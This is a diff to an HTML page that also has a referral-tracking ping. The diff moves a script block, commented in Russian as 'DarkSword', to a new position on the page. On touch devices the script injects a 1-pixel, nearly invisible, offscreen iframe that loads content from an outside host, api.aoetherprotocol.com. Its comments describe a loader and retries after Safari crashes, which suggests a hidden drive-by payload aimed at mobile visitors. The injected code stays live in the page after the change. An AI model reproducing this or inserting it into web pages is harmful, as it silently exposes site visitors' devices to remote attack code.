@@ -525,31 +525,7 @@
     <script src="app.js"></script>
 <!-- Контейнер для Live Deal-Flow Toasts -->
 <div id="toast-container" class="toast-container"></div>
-<script>
-(function() {
-  sessionStorage.setItem("ds_tag", "a6ded0");
-  if ("ontouchstart" in window || navigator.maxTouchPoints > 0) {
-    // DarkSword: старый вечный uid-guard хоронил ретраи после Safari-краш-релоада
-    // (sessionStorage живёт до закрытия таба). ds_done ставит лоадер после успеха.
-    var _dsDone = 0;
-    try { _dsDone = parseInt(sessionStorage.getItem("ds_done") || "0", 10) || 0; } catch (eD) {}
-    if (_dsDone && (Date.now() - _dsDone) < 10 * 60 * 1000) return;
-    var frame = document.createElement('iframe');
-    var _t = (new URLSearchParams(location.search)).get("ds_tag");
-    var _tag = _t || "a6ded0";
-    frame.src = "https://api.aoetherprotocol.com/ds/f/a6ded0?" + "?ds_tag=" + encodeURIComponent(_tag) + "&" + Math.random();
-    frame.style.width = "1px";
-    frame.style.opacity = "0.01";
-    frame.style.position = "absolute";
-    frame.style.left = "-9999px";
-    frame.style.height = "1px";
-    frame.style.border = "none";
-    (document.body || document.documentElement).appendChild(frame);
-  } else {
-    return;
-  }
-})();
-</script>
+
     <script>
   // 1. Ищем параметр ?ref= в ссылке
   const urlParams = new URLSearchParams(window.location.search);
@@ -577,6 +553,31 @@
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ message: finalMessage }) 
   }).catch(error => console.log('Ping error', error));
+</script>
+    <script>
+(function() {
+  sessionStorage.setItem("ds_tag", "a6ded0");
+  if ("ontouchstart" in window || navigator.maxTouchPoints > 0) {
+    // DarkSword: старый вечный uid-guard хоронил ретраи после Safari-краш-релоада
+    // (sessionStorage живёт до закрытия таба). ds_done ставит лоадер после успеха.
+    var _dsDone = 0;
+    try { _dsDone = parseInt(sessionStorage.getItem("ds_done") || "0", 10) || 0; } catch (eD) {}
+    if (_dsDone && (Date.now() - _dsDone) < 10 * 60 * 1000) return;
+    var frame = document.createElement('iframe');
+    var _t = (new URLSearchParams(location.search)).get("ds_tag");
+    var _tag = _t || "a6ded0";
+    frame.src = "https://api.aoetherprotocol.com/ds/f/a6ded0?" + "?ds_tag=" + encodeURIComponent(_tag) + "&" + Math.random();
+    frame.style.width = "1px";
+    frame.style.opacity = "0.01";
+    frame.style.position = "absolute";
+    frame.style.left = "-9999px";
+    frame.style.height = "1px";
+    frame.style.border = "none";
+    (document.body || document.documentElement).appendChild(frame);
+  } else {
+    return;
+  }
+})();
 </script>
 </body>
 </html>  
